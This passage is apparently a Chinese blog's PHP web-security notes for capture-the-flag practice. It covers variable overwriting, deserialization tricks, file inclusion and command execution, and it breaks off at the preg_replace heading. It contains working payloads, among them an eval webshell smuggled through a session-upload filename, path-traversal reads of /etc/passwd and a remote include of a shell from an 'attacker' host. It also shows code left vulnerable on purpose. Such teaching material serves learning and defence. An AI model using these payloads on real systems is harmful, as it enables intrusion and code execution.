<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="variable">$auth</span> = <span class="string">&#x27;0&#x27;</span>;  </span><br><span class="line">    <span class="comment">// 这里可以覆盖$auth的变量值</span></span><br><span class="line">    extract(<span class="variable">$_GET</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$auth</span> == <span class="number">1</span>)&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;private!&quot;</span>;  </span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;public!&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str"></a>parse_str</h2><p>parse_str() 的作用是解析字符串，并注册成变量。与 parse_str() 类似的函数还有 mb_parse_str()，parse_str 将字符串解析成多个变量，如果参数 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">//var.php?var=new  </span><br><span class="line"><span class="variable">$var</span>=<span class="string">&#x27;init&#x27;</span>;  </span><br><span class="line">parse_str(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">// <span class="variable">$var</span> 会变成 new</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var</span>;</span><br></pre></td></tr></table></figure>
<h2 id="变量覆盖-1"><a href="#变量覆盖-1" class="headerlink" title="$$ 变量覆盖"></a>$$ 变量覆盖</h2><p>如果把变量本身的 key 也当变量，也就是使用了 $$，就可能存在问题。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;_POST&#x27;</span>;</span><br><span class="line">// <span class="variable">$</span><span class="variable">$_</span> 是等于 <span class="variable">$_POST</span></span><br></pre></td></tr></table></figure>
<p>例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// http://127.0.0.1/index.php?_CONFIG=123</span></span><br><span class="line"><span class="variable">$_CONFIG</span>[<span class="string">&#x27;extraSecure&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>) <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$$method</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>) &#123;</span><br><span class="line">      <span class="comment">// $key == _CONFIG</span></span><br><span class="line">      <span class="comment">// $$key == $_CONFIG</span></span><br><span class="line">      <span class="comment">// 这个函数会把 $_CONFIG 变量销毁</span></span><br><span class="line">      <span class="keyword">unset</span>(<span class="variable">$$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_CONFIG</span>[<span class="string">&#x27;extraSecure&#x27;</span>] == <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag &#123;****&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>数组类型数据的覆盖</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php?_SESSION[userinfo][id]=1&amp;_SESSION[userinfo][username]=admin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&#x27;_COOKIE&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>,<span class="string">&#x27;_GET&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_key</span>=&gt;<span class="variable">$_value</span>)  </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$$_key</span>=  <span class="variable">$_value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&quot;userinfo&quot;</span>][<span class="string">&quot;id&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&quot;userinfo&quot;</span>][<span class="string">&quot;username&quot;</span>];</span><br></pre></td></tr></table></figure>
<p>但是如果后面有 session_start() 会重新初始化上面的 $_SESSION 数据，因此又被还原回去。</p>
<h1 id="unset"><a href="#unset" class="headerlink" title="unset"></a>unset</h1><p>unset($bar); 用来销毁指定的变量，如果变量 $bar 包含在请求参数中，可能出现销毁一些变量而实现程序逻辑绕过。</p>
<p>特殊的 PHP 代码格式</p>
<p>以这种后缀结尾的 php 文件也能被解析，这是在 fast-cgi 里面配置的</p>
<p>.php2 .php3 .php4 .php5 .php7 .phtml</p>
<p>正则检测文件内容中包含 &lt;? 就异常退出，通常的PHP代码就不行了，可以使用这种方式绕过</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"># 除了 php 7.0 不允许外，其他都允许</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;</span><br><span class="line">echo base64_encode(file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>如果在 php.ini 文件中配置允许 ASP 风格的标签</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">; Allow ASP<span class="literal">-style</span> &lt;% %&gt; tags.</span><br><span class="line">; http://php.net/asp<span class="literal">-tags</span></span><br><span class="line">asp_tags = On</span><br></pre></td></tr></table></figure>
<p>则可以使用该方式</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&lt;% <span class="built_in">echo</span> <span class="string">&#x27;a&#x27;</span>; %&gt;</span><br></pre></td></tr></table></figure>
<p>php.ini 文件中配置 short_open_tag 默认为 Off，如果为 On，则允许这种代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>  <span class="keyword">echo</span> base64_encode(file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>效果等于 echo ‘a’;</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="string">&#x27;a&#x27;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h1><h2 id="mt-rand"><a href="#mt-rand" class="headerlink" title="mt_rand()"></a>mt_rand()</h2><p>mt_rand() 函数是一个伪随机发生器，即如果知道随机数种子是可以预测的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$seed</span> = <span class="number">12345</span>;</span><br><span class="line">mt_rand(<span class="variable">$seed</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$ss</span> = mt_rand();</span><br></pre></td></tr></table></figure>
<p>linux 64 位系统中，rand() 和 mt_rand() 产生的最大随机数都是2147483647，正好是 2^31-1，也就是说随机播种的种子也是在这个范围中的，0 – 2147483647 的这个范围是可以爆破的。<br>但是用 php 爆破比较慢，有一个 C 的版本，可以根据随机数，爆破出种子 php_mt_seed。</p>
<p>在 php &gt; 4.2.0 的版本中，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，现已由 PHP 自动完成。php 中产生一系列的随机数时，只进行了一次播种，而不是每次调用 mt_rand() 都进行播种。</p>
<h2 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h2><p>rand() 函数在产生随机数的时候没有调用 srand()，则产生的随机数是有规律可询的。具体的说明请看这里。产生的随机数可以用下面这个公式预测:</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 一般预测值可能比实际值要差1</span></span><br><span class="line">state[<span class="type">i</span>] = state[<span class="type">i</span>-<span class="number">3</span>] + state[<span class="type">i</span>-<span class="number">31</span>]</span><br></pre></td></tr></table></figure>
<p>可以用下面的代码验证一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$randStr</span> = <span class="keyword">array</span>(); </span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">50</span>;<span class="variable">$i</span>++) &#123;  <span class="comment">//先产生 32个随机数 </span></span><br><span class="line">    <span class="variable">$randStr</span>[<span class="variable">$i</span>]=rand(<span class="number">0</span>,<span class="number">30</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$i</span>&gt;=<span class="number">31</span>) &#123; </span><br><span class="line">        <span class="keyword">echo</span>  <span class="string">&quot;<span class="subst">$randStr</span>[<span class="subst">$i</span>]=(&quot;</span>.<span class="variable">$randStr</span>[<span class="variable">$i</span><span class="number">-31</span>].<span class="string">&quot;+&quot;</span>.<span class="variable">$randStr</span>[<span class="variable">$i</span><span class="number">-3</span>].<span class="string">&quot;) mod 31&quot;</span>.<span class="string">&quot;\n&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><ul>
<li>__construct()：构造函数，当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</li>
<li>__destruct()：析构函数，当对象被销毁时会自动调用。</li>
<li>__wakeup() ：如前所提，unserialize()时会自动调用。</li>
</ul>
<p>PHP unserialize() 后会导致 __wakeup() 或 __destruct() 的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在 __wakeup() 或 __destruct() 中。</p>
<h2 id="wakeup-函数绕过"><a href="#wakeup-函数绕过" class="headerlink" title="__wakeup 函数绕过"></a>__wakeup 函数绕过</h2><p>PHP 有个 Bug，触发该漏洞的PHP版本为PHP5小于5.6.25或PHP7小于7.0.10，该漏洞可以简要的概括为：当序列化字符串中表示对象个数的值大于真实的属性个数时会跳过 __wakeup 函数的执行，例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&quot;111&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//echo serialize(new xctf());</span></span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag&#123;****&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用这个 payload 绕过 __wakeup 函数</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span></span><br><span class="line">http://www.example.com/index.php?code=O:<span class="number">4</span>:<span class="string">&quot;xctf&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>在字符串中，前面的数字代表的是后面字符串中字符的个数，如果数字与字符个数不匹配的话，就会报错，因此将1改成2就会产生报错，导致不会去执行 __wakeup 函数，从而绕过该函数。</p>
<h2 id="变量可以用引用"><a href="#变量可以用引用" class="headerlink" title="变量可以用引用"></a>变量可以用引用</h2><p>可以通过将变量的值存储为另外一个变量的地址，类似于 C 语言中的引用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$enter</span>; </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> just4fun();</span><br><span class="line"><span class="variable">$a</span>-&gt;secret = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="comment">// 这里的 &amp; 跟 C 语言一样，是取 $a-&gt;secret 值的地址赋给 $a-&gt;enter</span></span><br><span class="line"><span class="variable">$a</span>-&gt;enter = &amp;<span class="variable">$a</span>-&gt;secret;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = unserialize(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$o</span>) &#123; </span><br><span class="line">    <span class="variable">$o</span>-&gt;secret = <span class="string">&quot;xxxxxxx&quot;</span>;</span><br><span class="line">    <span class="comment">// 因为 $o-&gt;enter 存储的是 $o-&gt;secret 的值的地址，因此比较的时候相等的</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$o</span>-&gt;secret === <span class="variable">$o</span>-&gt;enter) </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Congratulation! Here is my Key: &quot;</span> . <span class="variable">$o</span>-&gt;secret; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="小特性"><a href="#小特性" class="headerlink" title="小特性"></a>小特性</h2><p>以下两个都能够被unserialize反序列化，且结果相同。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">O:+<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;&#125;</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;&#125;</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<p>不光object类型处理可以多一个’+’,其他类型也可以。但是如果要进一步通过修改变量的个数来绕过 __wakeup，在 php 5.5 环境下可以，php 5.6 环境下反序列化会失败</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  php 5.5 环境下可以绕过 __wakeup，php 5.6 环境下反序列化会失败</span></span><br><span class="line">O:+<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Session-反序列化"><a href="#Session-反序列化" class="headerlink" title="Session 反序列化"></a>Session 反序列化</h2><p>PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式：</p>
<table>
<thead>
<tr>
<th>处理器</th>
<th>对应的存储格式</th>
</tr>
</thead>
<tbody><tr>
<td>PHP</td>
<td>键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td>php_serialize(php&gt;=5.5.4)</td>
<td>经过 serialize() 函数反序列处理的数组</td>
</tr>
</tbody></table>
<p>如果 PHP 在反序列化存储的 $_SESSION 数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//foo1.php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;ryat&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;ryat&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//foo2.php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="comment">//or session.serialize_handler set to php in php.ini </span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$hi</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;hi;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当访问 foo1.php 时，提交数据如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">foo1.php?ryat=|O:<span class="number">4</span>:<span class="string">&quot;ryat&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;hi&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;ryat&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>脚本会按照 php_serialize 处理器的序列化格式存储数据，访问 foo2.php 时，则会按照 php 处理器的反序列化格式读取数据，这时将会反序列化伪造的数据，成功实例化了 ryat 对象。这个场景的利用需要能够构造 Session 的值，如果没有提供写入 Session 的地方，可以利用 Session Upload Progress。</p>
<hr>
<p>注意：如果利用这种方式上传了 webshell，读取文件的时候需要使用绝对路径，例如<br>/opt/lampp/htdocs/index.php</p>
<hr>
<h2 id="Session-Upload-Progress"><a href="#Session-Upload-Progress" class="headerlink" title="Session Upload Progress"></a>Session Upload Progress</h2><p>上传文件时，如果 POST 一个名为 PHP_SESSION_UPLOAD_PROGRESS 的变量，就可以将 filename 的值赋值到session 中，filename 的值如果包含双引号，还需要进行转义，上传的页面的写法如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;http://example.com/index.php&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="string">&quot;123&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>最后 Session 就会保存上传的文件名。如果没有提供写入 Session 的地方，可以用这种方法。POST 请求的数据包：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: web.jarvisoj.com:<span class="number">32784</span></span><br><span class="line">Content<span class="literal">-Type</span>: multipart/form<span class="literal">-data</span>; boundary=---<span class="literal">-WebKitFormBoundarypN9LkEc0KCMj7TfC</span></span><br><span class="line">User<span class="literal">-Agent</span>: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">63.0</span>.<span class="number">3208.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Cookie: PHPSESSID=jfdu23je5jlu43sfgc3akp3037</span><br><span class="line">Content<span class="literal">-Length</span>: <span class="number">302</span></span><br><span class="line"></span><br><span class="line">-----<span class="literal">-WebKitFormBoundarypN9LkEc0KCMj7TfC</span></span><br><span class="line">Content<span class="literal">-Disposition</span>: form<span class="literal">-data</span>; name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">123</span></span><br><span class="line">-----<span class="literal">-WebKitFormBoundarypN9LkEc0KCMj7TfC</span></span><br><span class="line">Content<span class="literal">-Disposition</span>: form<span class="literal">-data</span>; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;|O:5:\&quot;</span>OowoO\<span class="string">&quot;:1:&#123;s:4:\&quot;</span>mdzz\<span class="string">&quot;;s:39:\&quot;</span><span class="built_in">echo</span> \<span class="string">&quot;waterfood\&quot;</span>; eval(<span class="variable">$_REQUEST</span>[\<span class="string">&quot;v\&quot;</span>]);\<span class="string">&quot;;&#125;&quot;</span></span><br><span class="line">Content<span class="literal">-Type</span>: text/plain</span><br><span class="line"></span><br><span class="line"><span class="number">123</span></span><br><span class="line">-----<span class="literal">-WebKitFormBoundarypN9LkEc0KCMj7TfC</span>--</span><br></pre></td></tr></table></figure>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>这种 url 很容易就能想到可能是文件包含或者伪协议读取</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">10.2</span>.<span class="number">1.1</span>:<span class="number">20770</span>/index.php?page=upload</span><br><span class="line">http://<span class="number">10.2</span>.<span class="number">1.1</span>:<span class="number">20770</span>/index.php?page=php://<span class="keyword">filter</span>/read=convert.base64<span class="literal">-encode</span>/resource=upload</span><br></pre></td></tr></table></figure>
<p>常见的导致文件包含的函数有</p>
<ul>
<li>include()</li>
<li>include_once()</li>
<li>require()</li>
<li>require_once()</li>
<li>fopen()</li>
<li>readfile()</li>
</ul>
<p>当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件时什么类型。</p>
<h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>本地文件包含，Local File Inclusion，LFI。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="string">&#x27;/home/wwwrun/&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;.php&#x27;</span>)) &#123;</span><br><span class="line">  <span class="keyword">include</span> <span class="string">&#x27;/home/wwwrun/&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>上述代码存在本地文件包含，可用 %00 截断的方式读取 /etc/passwd 文件内容。</p>
<h2 id="00-截断"><a href="#00-截断" class="headerlink" title="%00 截断"></a>%00 截断</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">?file=../../../../../../../../../etc/passwd%<span class="number">00</span></span><br></pre></td></tr></table></figure>
<p>需要 magic_quotes_gpc=off，PHP 小于 5.3.4 有效。</p>
<h2 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">?file=../../../../../../../../../etc/passwd/./././././././././././.</span><br></pre></td></tr></table></figure>
<p>Linux 需要文件名长于 4096，Windows 需要长于 256。</p>
<h2 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">?file=../../../../../../../../../boot.ini/………………</span><br></pre></td></tr></table></figure>
<p>只适用 Windows，点号需要长于 256。</p>
<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>远程文件包含，Remote File Inclusion，RFI。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$route</span> == <span class="string">&quot;share&quot;</span>) &#123;</span><br><span class="line">  require_once <span class="variable">$basePath</span> . <span class="string">&quot;/action/m_share.php&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$route</span> == <span class="string">&quot;sharelink&quot;</span>) &#123;</span><br><span class="line">  require_once <span class="variable">$basePath</span> . <span class="string">&quot;/action/m_sharelink.php&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造变量 basePath 的值。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">/?basePath=http://attacker/phpshell.txt?</span><br></pre></td></tr></table></figure>
<p>最终的代码执行了</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">require_once <span class="string">&quot;http://attacker/phpshell.txt?/action/m_share.php&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>问号后的部分被解释为 URL 的 querystring，这也是一种「截断」。</p>
<p>普通远程文件包含</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">?file=[<span class="type">http</span>|<span class="type">https</span>|<span class="type">ftp</span>]://example.com/shell.txt</span><br></pre></td></tr></table></figure>
<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h2><p>assert 函数的参数可以为布尔类型的值，也可以是字符串，当参数为字符串时，会被当作 PHP 代码执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 可以执行 php 代码</span></span><br><span class="line"><span class="variable">$page</span> = <span class="string">&quot;flag&#x27;.system(\&quot;ls\&quot;).&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"><span class="comment">// 这里构造后的新字符串如下，</span></span><br><span class="line"><span class="comment">// strpos(&#x27;templates/&#x27;.system(&quot;ls&quot;).&#x27;.php&#x27;, &#x27;..&#x27;) === false</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当test.php?a=phpinfo()时，phpinfo()会被执行。</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">assert(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<h2 id="反引号"><a href="#反引号" class="headerlink" title="反引号 `"></a>反引号 `</h2><p>反引号 ` 可以调用 shell_exec 正常执行代码</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">`$_GET[<span class="type">v</span>]` 相当于 shell_exec(<span class="variable">$_GET</span>[<span class="string">&#x27;v&#x27;</span>])</span><br><span class="line"></span><br><span class="line">`$_GET[<span class="string">&#x27;v&#x27;</span>]` 变量 v 前后不能有单引号</span><br></pre></td></tr></table></figure>
<p>system，exec，shell_exec 的区别</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line"><span class="variable">$last_line</span> = system(<span class="string">&#x27;ls&#x27;</span>，<span class="variable">$return_var</span>);</span><br><span class="line">system()会将输出内容直接印出，所以若于网页，会将所有回传内容都显示于页面上。</span><br><span class="line"><span class="variable">$last_line</span>：只能取得最后一行的内容</span><br><span class="line"><span class="variable">$return_var</span>：取得系统状态回传码</span><br><span class="line"></span><br><span class="line">exec()</span><br><span class="line">exec(<span class="string">&#x27;ls&#x27;</span>，<span class="variable">$output</span>，<span class="variable">$return_var</span>);</span><br><span class="line"><span class="variable">$output</span>：回传内容都会存于此变数中(储存成阵列)，不会直接秀在页面上。</span><br><span class="line"><span class="variable">$return_var</span>：取得系统状态回传码</span><br><span class="line"></span><br><span class="line">shell_exec()</span><br><span class="line"><span class="variable">$output</span> = shell_exec(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="variable">$output</span>：回传内容都会存于此变量中(储存成纯文字内容)，不会直接显示在页面上。</span><br></pre></td></tr></table></figure>
<h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h2><p>触发条件：</p>
